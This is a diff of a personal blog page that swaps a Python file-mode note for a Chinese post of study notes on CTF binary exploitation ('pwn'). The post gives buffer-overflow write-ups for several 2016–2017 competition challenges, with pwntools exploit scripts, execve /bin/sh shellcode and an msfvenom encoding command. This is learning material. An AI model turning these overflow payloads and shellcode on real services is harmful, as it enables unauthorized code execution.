@@ -6,20 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>python--走过的坑 | Nimo-Zhang的博客</title>
+  <title>pwn(1) | Nimo-Zhang的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="python中’w’和’wb’遇到的坑">
-<meta name="keywords" content="知识积累">
+  <meta name="description" content="学习pwn的笔记教程链接csaw ctf 2016 quals-warmup运行程序，输出一个地址，这个地址可能是我们需要执行的函数的地址。1234$ ./warmup -Warm Up-WOW:0x40060d&amp;gt;11111111111111111111111111111111111111111111111111111111111111111111 使用IDA打开分析，可以看到代码：1234">
+<meta name="keywords" content="pwn学习">
 <meta property="og:type" content="article">
-<meta property="og:title" content="python--走过的坑">
-<meta property="og:url" content="http://yoursite.com/2018/07/26/python-走过的坑/index.html">
+<meta property="og:title" content="pwn(1)">
+<meta property="og:url" content="http://yoursite.com/2018/08/22/pwn-1/index.html">
 <meta property="og:site_name" content="Nimo-Zhang的博客">
-<meta property="og:description" content="python中’w’和’wb’遇到的坑">
+<meta property="og:description" content="学习pwn的笔记教程链接csaw ctf 2016 quals-warmup运行程序，输出一个地址，这个地址可能是我们需要执行的函数的地址。1234$ ./warmup -Warm Up-WOW:0x40060d&amp;gt;11111111111111111111111111111111111111111111111111111111111111111111 使用IDA打开分析，可以看到代码：1234">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-08-16T01:52:12.050Z">
+<meta property="og:image" content="http://yoursite.com/2018/08/22/pwn-1/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/22/pwn-1/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/22/pwn-1/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/22/pwn-1/4.png">
+<meta property="og:updated_time" content="2018-08-23T06:39:48.679Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="python--走过的坑">
-<meta name="twitter:description" content="python中’w’和’wb’遇到的坑">
+<meta name="twitter:title" content="pwn(1)">
+<meta name="twitter:description" content="学习pwn的笔记教程链接csaw ctf 2016 quals-warmup运行程序，输出一个地址，这个地址可能是我们需要执行的函数的地址。1234$ ./warmup -Warm Up-WOW:0x40060d&amp;gt;11111111111111111111111111111111111111111111111111111111111111111111 使用IDA打开分析，可以看到代码：1234">
+<meta name="twitter:image" content="http://yoursite.com/2018/08/22/pwn-1/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Nimo-Zhang的博客" type="application/atom+xml">
   
@@ -173,45 +178,55 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-python-走过的坑" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-pwn-1" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      python--走过的坑
+      pwn(1)
     </h1>
   
 
         
-        <a href="/2018/07/26/python-走过的坑/" class="archive-article-date">
-  	<time datetime="2018-07-26T01:46:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-26</time>
+        <a href="/2018/08/22/pwn-1/" class="archive-article-date">
+  	<time datetime="2018-08-22T07:58:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-22</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>python中’w’和’wb’遇到的坑</p>
+        <h2 id="学习pwn的笔记教程链接"><a href="#学习pwn的笔记教程链接" class="headerlink" title="学习pwn的笔记教程链接"></a>学习pwn的笔记<a href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" target="_blank" rel="noopener">教程链接</a></h2><h3 id="csaw-ctf-2016-quals-warmup"><a href="#csaw-ctf-2016-quals-warmup" class="headerlink" title="csaw ctf 2016 quals-warmup"></a>csaw ctf 2016 quals-warmup</h3><p>运行程序，输出一个地址，这个地址可能是我们需要执行的函数的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./warmup </span><br><span class="line">-Warm Up-</span><br><span class="line">WOW:0x40060d</span><br><span class="line">&gt;11111111111111111111111111111111111111111111111111111111111111111111</span><br></pre></td></tr></table></figure></p>
+<p>使用IDA打开分析，可以看到代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"-Warm Up-\n"</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"WOW:"</span>, <span class="number">4u</span>LL);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"%p\n"</span>, sub_40060D);</span><br><span class="line">  write(<span class="number">1</span>, &amp;s, <span class="number">9u</span>LL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"&gt;"</span>, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> gets(&amp;v5, <span class="string">"&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到是一个标准的栈溢出实例。main函数中使用gets函数来接受输入并返回。输入的内容是在v5的地址(rb–40h)里，目标是要用0x40060D覆盖rbp+8（main函数的返回地址）。<a href="https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64" target="_blank" rel="noopener">Stack frame layout on x86-64</a><a href="https://eli.thegreenplace.net/2011/02/04/where-the-top-of-the-stack-is-on-x86/" target="_blank" rel="noopener">Where the top of the stack is on x86</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'pwn.chal.csaw.io'</span>, <span class="number">8000</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.sendline(<span class="string">'A'</span>*<span class="number">72</span> + p64(<span class="number">0x40060d</span>))</span><br><span class="line"><span class="keyword">print</span> r.recvall()</span><br></pre></td></tr></table></figure></p>
+<h3 id="sCTF-2016-q1-pwn1"><a href="#sCTF-2016-q1-pwn1" class="headerlink" title="sCTF 2016 q1-pwn1"></a>sCTF 2016 q1-pwn1</h3><p>运行程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./pwn1</span><br><span class="line">Tell me something about yourself: aaaaaaaaaaaaaaaaa</span><br><span class="line">So, aaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure></p>
+<p>查看保护机制有NX<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure></p>
+<p>进入IDA，可以看到存在危险函数strcpy，并且通过字符串flag找到get_flag函数（地址0x08048F0D）。输入中的gets函数有长度限制，最多只能执行32位，而溢出需要60位(0x3C)+4位ebp+4位返回地址。正常输入将不能实现溢出覆盖，但是程序里将输入中的I转化成为you，因此，如果我们输入一定的I，在缓冲区不变的情况下转化为you后将会造成缓冲区溢出而覆盖掉返回地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(ip,port)<span class="comment">#自己设定</span></span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">payload=<span class="string">"I"</span>*<span class="number">20</span>+<span class="string">"a"</span>*<span class="number">4</span>+p32(<span class="number">0x08048F0D</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br></pre></td></tr></table></figure></p>
+<h3 id="Tokyo-West-CTF-3rd-2017-just-do-it"><a href="#Tokyo-West-CTF-3rd-2017-just-do-it" class="headerlink" title="Tokyo West CTF 3rd 2017-just_do_it"></a>Tokyo West CTF 3rd 2017-just_do_it</h3><p>运行程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ ./just_do_it </span><br><span class="line">Welcome my secret service. Do you know the password?</span><br><span class="line">Input the password.</span><br><span class="line">sss</span><br><span class="line">Invalid Password, Try Again!</span><br><span class="line">咋一看感觉对输入都有限制找不到溢出点，仔细分析发现gets函数虽然限制了32但是可以覆盖其他变量，而puts函数会根据地址输出信息，因此可以通过输入覆盖打印的地址。覆盖内容长度为20(0x20-0x0C=0x14)+地址长度，flag偏移0x0804A080。</span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">r = remote(ip,port)</span><br><span class="line">print r.recv()</span><br><span class="line">payload = 20 * &apos;A&apos; + p32(0x0804A080)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">print r.recv()</span><br></pre></td></tr></table></figure></p>
+<h3 id="EasyCTF-2017-doubly-dangerous"><a href="#EasyCTF-2017-doubly-dangerous" class="headerlink" title="EasyCTF 2017-doubly_dangerous"></a>EasyCTF 2017-doubly_dangerous</h3><p>运行程序要求输入一个string，可以看到当输入长度很长时将会出现缓冲区溢出。<br>查看保护机制，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure></p>
+<p>IDA分析，要成功执行give_flag函数，需要使if条件为true，v5可以通过输入的string进行覆盖。覆盖长度0x40（64）+ float数据<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote (ip,port)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">64</span>+ p32(<span class="number">0x41348000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br></pre></td></tr></table></figure></p>
+<h3 id="Openctf-2016-tyro-shellcode1"><a href="#Openctf-2016-tyro-shellcode1" class="headerlink" title="Openctf 2016-tyro_shellcode1"></a>Openctf 2016-tyro_shellcode1</h3><p>运行程序，可以看到是让输入shellcode。IDA分析。我们的输入在read函数之后将会被执行。<br><img src="/2018/08/22/pwn-1/1.png" alt="1"><br>因此只需要把shellcode作为输入传递给程序，然后使用interactive()与程序进行交互即可。</p>
+<h3 id="BSides-San-Francisco-CTF-2017-b-64-b-tuff"><a href="#BSides-San-Francisco-CTF-2017-b-64-b-tuff" class="headerlink" title="BSides San Francisco CTF 2017-b_64_b_tuff"></a>BSides San Francisco CTF 2017-b_64_b_tuff</h3><p>程序通过mmap函数分配了新内存，然后将输入进行base64编码后放在新开辟的内存中，然后执行该内存块。问题的关键在于base64的输入是有限制条件的，只能由0-9，a-z，A-Z，+，/,这些字符组成，但是shellcode显然无法满足。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><br></pre></td></tr></table></figure></p>
+<p>于是需要对其进行编码。<br>使用<code>msfvenom -l encoders</code> 选择编码器。<br>这里选择x86/alpha_mixed可以将shellcode编码成大小混合的代码，符合条件。<br>参数如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import sys; sys.stdout.write(&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;)&apos; | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload</span><br></pre></td></tr></table></figure></p>
+<p>由于msfvenom只能从stdin中读取，所以这里使用管道操作符“|”，把shellcode作为python程序的输出，从python的stddout传送到msfvenom的stdin，此外配置编码器为x86/alpha_mixed，配置目标平台架构等信息，输出到文件名为payload的文件中，最后在b-64-b-tuff中是通过指令call eax调用shellcode的，所以配置<code>BufferRegister=EAX</code>。<br>打开payload文件，得到payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIUa9YYgkQlp6k0QBH6OTosCsXbHtoQrqypnOyhc8MopAA</span><br></pre></td></tr></table></figure></p>
+<h3 id="Openctf-2016-apprentice-www"><a href="#Openctf-2016-apprentice-www" class="headerlink" title="Openctf 2016-apprentice_www"></a>Openctf 2016-apprentice_www</h3><p>运行程序可知，缓冲区溢出。IDA分析，在main函数中有一个setup函数，该函数功能是将.text，.data，.bss段的权限设置为可读可写可执行（注意，这里使得text段可写可执行）。setup之后是函数butterflySwag，该函数要求输入两个变量，其中一个会被当作地址，另一个将作为值（byte）之后存在刚刚输入的那个地址中。</p>
+<p>最终目标：通过覆写text段来执行shellcode。</p>
+<p>两次任务：<br>第一次，修改跳转逻辑，第二次，布置shellcode。</p>
+<p>每一轮输入相当于有一个byte字节的patch机会。<a href="http://uaf.io/exploitation/2016/08/05/openCTF-apprentice_www.html" target="_blank" rel="noopener">参考链接</a></p>
+<blockquote>
+<p>So we have a 1 byte patch anywhere in the binary including the .text segment. Of course we can’t get a shell with just a single byte, so let’s make a way to get more bytes in there. Since one of following if statements are conveniently close to the code taking input and considering they are all short conditional jumps which are a 1 byte opcode 0x75 (for the JNE) followed by 1 byte signed char distance to jump we can patch the first if statement with a negative byte distance to jump back if byte != 0.<br><img src="/2018/08/22/pwn-1/2.png" alt="2"><br>0E=0x080485E9-0x080485DB<br>第一步，往0x080485DA这里写入跳转偏移，使jnz loc_80485E9改成jnz loc_804859D，这样可以重复执行两个call __isoc99_scanf读取shellcode。<br>第二步，逐字节写入shellcode。<br><img src="/2018/08/22/pwn-1/3.png" alt="3"><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(ip,port)</span><br><span class="line">patch_jne_address = <span class="number">0x080485da</span> <span class="comment">#patch跳转偏移所在地址</span></span><br><span class="line">shellcode_address = <span class="number">0x080485db</span> <span class="comment">#shellcode放置地址</span></span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line">io.sendline(str(patch_jne_address))</span><br><span class="line">io.sendline(str(<span class="number">0xc2</span>)) <span class="comment">#将jnz loc_80485E9改成jnz loc_804859D，重复执行两个call __isoc99_scanf读取shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(shellcode)): <span class="comment">#逐字节写入shellcode到jnz loc_80485E9指令后面</span></span><br><span class="line">	io.sendline(str(shellcode_address+i))</span><br><span class="line">	io.sendline(str(ord(shellcode[i])))</span><br><span class="line"></span><br><span class="line">io.sendline(str(patch_jne_address))</span><br><span class="line">io.sendline(str(<span class="number">0x00</span>)) <span class="comment">#写完shellcode后改为jnz loc_80485DB，执行shellcode</span></span><br><span class="line"></span><br><span class="line">io.recv()	<span class="comment">#把垃圾数据读走</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
 </blockquote>
-<a id="more"></a>
-<h3 id="w-amp-wb"><a href="#w-amp-wb" class="headerlink" title="w&amp;wb"></a>w&amp;wb</h3><p>在做misc杂项的时候，根据hint知道是将图片内容异或，当时已经将多余的图片提取出来了，在网上找了代码将图片与0xff异或，然后异或后发现图片一直为黑色，当时也没多想，查看其二进制格式后，发现文件头不对，就修改了文件头，但还是为黑色。</p>
-<p>看了别人的writeup时，发现自己的思路没错，用别人的代码异或后，发现了黑白格子图片，而自己的依然始终为黑色。这才发现自己的代码有错，异或后的文件长度增加了几个字节。</p>
-<p>查了半天，才知道是w和wb的问题，自己之前没注意到这里。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 原始代码</span><br><span class="line">a=open(&apos;1.txt&apos;,&apos;rb&apos;).read()</span><br><span class="line">print len(a)</span><br><span class="line">cmpf=open(&apos;2.txt&apos;,&apos;w&apos;)</span><br><span class="line">xor=&apos;&apos;</span><br><span class="line">for i in range(0,len(a)):</span><br><span class="line">	aa = ord(a[i])^0xff</span><br><span class="line">	xor += chr(aa) </span><br><span class="line">cmpf.write(xor)</span><br><span class="line">cmpf.close()</span><br></pre></td></tr></table></figure>
-<p>发现当txt中为0xf5的时候，异或后写入文件的居然为两个字符，为0x0D0A。</p>
-<p>网上已经有人说了为什么了，这里自己做个笔记，也算是给自己一个教训。</p>
-<p>总结：</p>
-<ul>
-<li>w是以文本方式打开文件，wb是以二进制方式打开文件</li>
-<li>0x0A LF 表示换行， 0x0D CR表示回车， 0x1A SUB在文本文件中表示文件结束</li>
-<li>使用’r’进行读取二进制文件时，可能会出现文档读取不全的现象。 因为在python中读文件时，读到文档结束符(EOF)就认为是读到文件最后，python遇到0x1A字节就会以为文档结束。</li>
-<li>在windows中，0x0A表示换行，如果以文本方式打开文件向文件中写入数据，遇到0x0A会自动将其转为两个字符’0x0D’,’0x0A’。所以这也是为什么导致当时异或后的结果数据长度变长的原因。因为0xf5异或后为0x0a，然后自己当时的代码在写文件时是以’w’的方式来写的，所以将其转为了’0x0D’和’0x0A’。在linux上运行程序不会出现这个问题，因为linux只使用’0x0a’来表示换行。</li>
-</ul>
-<p>在读写文件要注意保持前后一致。不管是文本文件还是二进制文件统一采用二进制进行读写不会出错。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#正确代码</span><br><span class="line">a=open(&apos;1.txt&apos;,&apos;rb&apos;).read()</span><br><span class="line">print len(a)</span><br><span class="line">cmpf=open(&apos;2.txt&apos;,&apos;wb&apos;)</span><br><span class="line">xor=&apos;&apos;</span><br><span class="line">for i in range(0,len(a)):</span><br><span class="line">	aa = ord(a[i])^0xff</span><br><span class="line">	xor += chr(aa) </span><br><span class="line">cmpf.write(xor)</span><br><span class="line">cmpf.close()</span><br></pre></td></tr></table></figure>
+<h3 id="0ctf-2017-char-后面来补这道题"><a href="#0ctf-2017-char-后面来补这道题" class="headerlink" title="0ctf 2017-char 后面来补这道题"></a>0ctf 2017-char 后面来补这道题</h3><p>保护机制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>NX即No–execute（不可执行），其原理是将数据所在内存页标识为不可执行，程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是执行恶意指令。<br>考虑使用ROP绕过该保护机制。</p>
+</blockquote>
+<h3 id="BITSCTF-2017-Command-Line"><a href="#BITSCTF-2017-Command-Line" class="headerlink" title="BITSCTF 2017-Command_Line"></a>BITSCTF 2017-Command_Line</h3><p>题目比较清晰，是64位的可执行文件。<br><img src="/2018/08/22/pwn-1/4.png" alt="4"><br>直接覆盖返回地址,返回地址距泄露地址的偏移为0x10+0x08（ebp位置）+0x08（返回指针位置）=0x20，覆盖内容24（0x10+ebp）*”\x90”，然后是返回地址，最后是shellcode。</p>
+<p>调用/usr/bin/bash的shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"</span></span><br><span class="line"><span class="comment">#xor rdi, rdi</span></span><br><span class="line"><span class="comment">#push rdi</span></span><br><span class="line"><span class="comment">#push rdi</span></span><br><span class="line"><span class="comment">#pop rsi</span></span><br><span class="line"><span class="comment">#pop rdx</span></span><br><span class="line"><span class="comment">#mov rdi, 68732F6E69622F2Fh</span></span><br><span class="line"><span class="comment">#shr rdi, 8</span></span><br><span class="line"><span class="comment">#push rdi</span></span><br><span class="line"><span class="comment">#push rsp</span></span><br><span class="line"><span class="comment">#pop rdi</span></span><br><span class="line"><span class="comment">#push 3Bh</span></span><br><span class="line"><span class="comment">#pop rax</span></span><br><span class="line"><span class="comment">#syscall</span></span><br><span class="line"></span><br><span class="line">shellcode_address_at_stack = int(io.recv()[:<span class="number">-1</span>], <span class="number">16</span>)+<span class="number">0x20</span>			<span class="comment">#泄露的栈地址+0x20即为我们放置的shellcode地址</span></span><br><span class="line">log.info(<span class="string">"Leak stack address = %x"</span>, shellcode_address_at_stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x90"</span>*<span class="number">24</span>													<span class="comment">#任意字符填充到栈中至保存的RIP处，此处选用了空指令NOP，即\x90作为填充字符</span></span><br><span class="line">payload += p64(shellcode_address_at_stack)							<span class="comment">#拼接shellcode所在的栈地址，劫持RIP到该地址以执行shellcode</span></span><br><span class="line">payload += shellcode												<span class="comment">#执行system("/bin/sh")的shellcode</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
       
 
       
@@ -224,7 +239,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">知识积累</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">pwn学习</a>
         		</li>
       		
 		</ul>
@@ -280,7 +295,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/07/26/python-走过的坑/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/08/22/pwn-1/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -294,18 +309,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/08/16/qwb题目梳理/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          &#39;qwb题目梳理&#39;
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/07/25/2018-7-21-巅峰极客/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">巅峰极客 reverse/misc</div>
+    <a href="/2018/08/21/2018网鼎杯（部分writeup）/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">2018 wd杯（部分writeup）</div>
       <i class="icon-circle-right"></i>
     </a>
   
